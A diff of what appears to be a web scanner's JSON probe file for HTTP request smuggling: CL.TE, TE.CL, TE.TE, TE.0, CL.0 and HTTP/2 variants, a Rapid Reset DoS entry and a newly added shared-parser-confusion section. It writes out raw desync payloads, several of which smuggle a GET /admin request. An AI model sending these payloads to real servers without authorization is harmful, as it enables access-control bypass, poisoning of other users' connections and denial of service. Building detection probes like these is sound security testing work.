@@ -10,20 +10,34 @@
     "7. DETECT WITHOUT BREAKING THE TARGET: timing-based (5s+ delay) > 4xx > smuggled body delivered. Don't poison shared cache without explicit authorization (R5 destructive concern).",
     "8. RESPONSE-SPLITTING via SMUGGLING: smuggled request gets victim's response. Use carefully; document scope authorization.",
     "9. WS UPGRADE PIVOT: smuggle a WebSocket Upgrade request; if origin upgrades, attacker controls a hijacked WS to victim.",
-    "10. HTTP/2 RAPID RESET (CVE-2023-44487): not strictly smuggling but related — opening many streams with immediate RST_STREAM is a DoS class on most h2 stacks."
+    "10. HTTP/2 RAPID RESET (CVE-2023-44487): not strictly smuggling but related \u2014 opening many streams with immediate RST_STREAM is a DoS class on most h2 stacks."
   ],
   "contexts": {
     "cl_te": {
-      "description": "CL.TE request smuggling — front-end uses Content-Length, back-end uses Transfer-Encoding",
-      "tech_match": ["Apache", "Nginx", "IIS"],
+      "description": "CL.TE request smuggling \u2014 front-end uses Content-Length, back-end uses Transfer-Encoding",
+      "tech_match": [
+        "Apache",
+        "Nginx",
+        "IIS"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
-          "description": "CL.TE smuggling detection — front-end forwards 6 bytes (Content-Length), back-end parses chunked and sees 0-length chunk terminator, leaving 'G' as start of next request. Timeout indicates back-end is waiting for the smuggled request to complete.",
+          "description": "CL.TE smuggling detection \u2014 front-end forwards 6 bytes (Content-Length), back-end parses chunked and sees 0-length chunk terminator, leaving 'G' as start of next request. Timeout indicates back-end is waiting for the smuggled request to complete.",
           "matchers": [
-            {"type": "timing", "min_ms": 5000},
-            {"type": "status", "status": [400, 403, 500]}
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                400,
+                403,
+                500
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 50
@@ -31,16 +45,30 @@
       ]
     },
     "te_cl": {
-      "description": "TE.CL request smuggling — front-end uses Transfer-Encoding, back-end uses Content-Length",
-      "tech_match": ["Apache", "Nginx", "IIS"],
+      "description": "TE.CL request smuggling \u2014 front-end uses Transfer-Encoding, back-end uses Content-Length",
+      "tech_match": [
+        "Apache",
+        "Nginx",
+        "IIS"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
-          "description": "TE.CL smuggling detection — front-end processes chunked encoding (chunk size 8 = 'SMUGGLED'), back-end reads only 3 bytes (Content-Length) and treats the rest as a new request. Timeout or status error indicates desync.",
+          "description": "TE.CL smuggling detection \u2014 front-end processes chunked encoding (chunk size 8 = 'SMUGGLED'), back-end reads only 3 bytes (Content-Length) and treats the rest as a new request. Timeout or status error indicates desync.",
           "matchers": [
-            {"type": "timing", "min_ms": 5000},
-            {"type": "status", "status": [400, 403, 500]}
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                400,
+                403,
+                500
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 50
@@ -48,36 +76,70 @@
       ]
     },
     "te_te": {
-      "description": "TE.TE request smuggling — both servers use Transfer-Encoding but one can be confused by obfuscated TE header variants",
-      "tech_match": ["Apache", "Nginx", "IIS"],
+      "description": "TE.TE request smuggling \u2014 both servers use Transfer-Encoding but one can be confused by obfuscated TE header variants",
+      "tech_match": [
+        "Apache",
+        "Nginx",
+        "IIS"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 3\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\n",
-          "description": "TE obfuscation via invalid value 'xchunked' — if front-end ignores malformed TE and falls back to Content-Length while back-end rejects and also falls back, differential parsing causes desync",
+          "description": "TE obfuscation via invalid value 'xchunked' \u2014 if front-end ignores malformed TE and falls back to Content-Length while back-end rejects and also falls back, differential parsing causes desync",
           "matchers": [
-            {"type": "timing", "min_ms": 5000},
-            {"type": "status", "status": [400, 403, 500]}
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                400,
+                403,
+                500
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 45
         },
         {
           "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 3\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\n",
-          "description": "TE obfuscation via tab before value — some servers reject TE headers with tab whitespace and fall back to Content-Length, creating parsing differential",
+          "description": "TE obfuscation via tab before value \u2014 some servers reject TE headers with tab whitespace and fall back to Content-Length, creating parsing differential",
           "matchers": [
-            {"type": "timing", "min_ms": 5000},
-            {"type": "status", "status": [400, 403, 500]}
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                400,
+                403,
+                500
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 45
         },
         {
           "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\n",
-          "description": "TE obfuscation via duplicate header with different case — one server uses first TE (chunked), the other uses second (invalid 'x') and falls back to Content-Length, causing desync",
+          "description": "TE obfuscation via duplicate header with different case \u2014 one server uses first TE (chunked), the other uses second (invalid 'x') and falls back to Content-Length, causing desync",
           "matchers": [
-            {"type": "timing", "min_ms": 5000},
-            {"type": "status", "status": [400, 403, 500]}
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                400,
+                403,
+                500
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 45
@@ -85,16 +147,31 @@
       ]
     },
     "te_zero": {
-      "description": "TE.0 — front-end uses Transfer-Encoding chunked, back-end ignores TE entirely and treats body as 0 bytes (because no Content-Length). Body bytes become the start of the NEXT request (2024 desync class).",
-      "tech_match": ["Apache", "Nginx", "IIS", "h2c"],
+      "description": "TE.0 \u2014 front-end uses Transfer-Encoding chunked, back-end ignores TE entirely and treats body as 0 bytes (because no Content-Length). Body bytes become the start of the NEXT request (2024 desync class).",
+      "tech_match": [
+        "Apache",
+        "Nginx",
+        "IIS",
+        "h2c"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nTransfer-Encoding: chunked\r\n\r\n26\r\nGET /admin HTTP/1.1\r\nHost: {{host}}\r\n\r\n0\r\n\r\n",
-          "description": "TE.0 — front-end uses chunked, back-end has no CL fallback and reads 0 bytes; smuggled GET /admin becomes the next request.",
+          "description": "TE.0 \u2014 front-end uses chunked, back-end has no CL fallback and reads 0 bytes; smuggled GET /admin becomes the next request.",
           "matchers": [
-            {"type": "timing", "min_ms": 5000},
-            {"type": "status", "status": [400, 401, 403]}
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                400,
+                401,
+                403
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 50
@@ -102,16 +179,30 @@
       ]
     },
     "cl_zero": {
-      "description": "CL.0 — back-end ignores Content-Length and reads 0 bytes (e.g. some HTTP/2 origins terminating from h2c). Body becomes start of next request (2024 desync class).",
-      "tech_match": ["h2c", "Envoy", "HAProxy"],
+      "description": "CL.0 \u2014 back-end ignores Content-Length and reads 0 bytes (e.g. some HTTP/2 origins terminating from h2c). Body becomes start of next request (2024 desync class).",
+      "tech_match": [
+        "h2c",
+        "Envoy",
+        "HAProxy"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 26\r\n\r\nGET /admin HTTP/1.1\r\nHost: {{host}}\r\n\r\n",
-          "description": "CL.0 — front-end forwards 26 bytes, back-end reads 0 (CL ignored); smuggled GET /admin becomes the next request seen by origin.",
+          "description": "CL.0 \u2014 front-end forwards 26 bytes, back-end reads 0 (CL ignored); smuggled GET /admin becomes the next request seen by origin.",
           "matchers": [
-            {"type": "timing", "min_ms": 5000},
-            {"type": "status", "status": [400, 401, 403]}
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                400,
+                401,
+                403
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 50
@@ -119,56 +210,151 @@
       ]
     },
     "h2_cl": {
-      "description": "H2.CL — HTTP/2 request with Content-Length header (spec says CL is informational on H2). Some h2c->h1 downgrading proxies trust the CL while origin uses the framed length, causing desync. Heavy 2024 research vector.",
-      "tech_match": ["h2c", "h2", "Envoy", "Apache", "Nginx"],
+      "description": "H2.CL \u2014 HTTP/2 request with Content-Length header (spec says CL is informational on H2). Some h2c->h1 downgrading proxies trust the CL while origin uses the framed length, causing desync. Heavy 2024 research vector.",
+      "tech_match": [
+        "h2c",
+        "h2",
+        "Envoy",
+        "Apache",
+        "Nginx"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "[Manual] Send HTTP/2 POST with Content-Length: 0 but actual body data. h2c proxy pads to 0; origin sees framed body. Smuggling primitive established. Use a manual h2 client (e.g. h2c.py).",
           "matchers": [
-            {"type": "timing", "min_ms": 5000},
-            {"type": "status", "status": [400, 500]}
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                400,
+                500
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 60,
-          "variables": {"manual_only": true}
+          "variables": {
+            "manual_only": true
+          }
         }
       ]
     },
     "h2_te": {
-      "description": "H2.TE — HTTP/2 request carrying Transfer-Encoding header (forbidden in H2). Some h2c origins still parse TE on the H1 side after downgrade.",
-      "tech_match": ["h2c", "h2", "Envoy", "Apache"],
+      "description": "H2.TE \u2014 HTTP/2 request carrying Transfer-Encoding header (forbidden in H2). Some h2c origins still parse TE on the H1 side after downgrade.",
+      "tech_match": [
+        "h2c",
+        "h2",
+        "Envoy",
+        "Apache"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "[Manual] HTTP/2 request with Transfer-Encoding: chunked + framed body. Origin downgrades to HTTP/1.1 and chunks the framed body, treating leftover as next request.",
           "matchers": [
-            {"type": "timing", "min_ms": 5000},
-            {"type": "status", "status": [400, 500]}
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                400,
+                500
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 60,
-          "variables": {"manual_only": true}
+          "variables": {
+            "manual_only": true
+          }
         }
       ]
     },
     "h2_rapid_reset": {
-      "description": "CVE-2023-44487 HTTP/2 Rapid Reset — open N streams + immediate RST_STREAM. Most h2 stacks process headers before honoring reset, causing CPU/memory exhaustion. Distinct from request smuggling but classed adjacent.",
-      "tech_match": ["h2", "Nginx", "Envoy", "Apache"],
+      "description": "CVE-2023-44487 HTTP/2 Rapid Reset \u2014 open N streams + immediate RST_STREAM. Most h2 stacks process headers before honoring reset, causing CPU/memory exhaustion. Distinct from request smuggling but classed adjacent.",
+      "tech_match": [
+        "h2",
+        "Nginx",
+        "Envoy",
+        "Apache"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] Open 100+ HTTP/2 streams + RST_STREAM each. Connection-level CPU spike or 502 cluster-wide indicates Rapid Reset DoS. Authorize before testing — DoS class.",
+          "description": "[Manual] Open 100+ HTTP/2 streams + RST_STREAM each. Connection-level CPU spike or 502 cluster-wide indicates Rapid Reset DoS. Authorize before testing \u2014 DoS class.",
           "matchers": [
-            {"type": "status", "status": [502, 503, 504]},
-            {"type": "timing", "min_ms": 10000}
+            {
+              "type": "status",
+              "status": [
+                502,
+                503,
+                504
+              ]
+            },
+            {
+              "type": "timing",
+              "min_ms": 10000
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
-          "variables": {"manual_only": true, "dos_class": true}
+          "variables": {
+            "manual_only": true,
+            "dos_class": true
+          }
+        }
+      ]
+    },
+    "shared_parser_confusion_2026": {
+      "description": "Shared-Parser Confusion (Kettle, BH USA 2026): When a front-end and back-end share the same HTTP parser library but configure it differently, conflicting Transfer-Encoding interpretations cause request desync. Found ~700 vulnerable targets across 30k authorized sites.",
+      "probes": [
+        {
+          "payload": "GET / HTTP/1.1\r\nHost: {{target}}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {{target}}\r\n\r\n",
+          "description": "Dual Transfer-Encoding with conflicting values (chunked vs identity). Shared parser picks one; different config picks the other. Response from /admin confirms desync.",
+          "matchers": [
+            {
+              "type": "status_diff",
+              "description": "Response status or body differs from baseline \u2014 desync detected"
+            },
+            {
+              "type": "word",
+              "words": [
+                "admin",
+                "dashboard",
+                "403",
+                "Forbidden"
+              ]
+            }
+          ]
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: {{target}}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n0\r\n\r\nX",
+          "description": "Dangling-byte variant: duplicate TE header with invalid second value. Some parsers ignore the invalid one (use chunked), others reject chunked entirely (use CL). The trailing X poisons the next request.",
+          "matchers": [
+            {
+              "type": "status_diff",
+              "description": "Timeout, 400, or unexpected response on the follow-up request indicates connection poisoning"
+            }
+          ]
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: {{target}}\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n1\r\nZ\r\n0\r\n\r\n",
+          "description": "Classic CL.TE with a single trailing byte. If the follow-up response arrives for a different path or user, the connection is desynchronized.",
+          "matchers": [
+            {
+              "type": "status_diff",
+              "description": "Follow-up request returns wrong content or 400/500"
+            }
+          ]
         }
       ]
     }
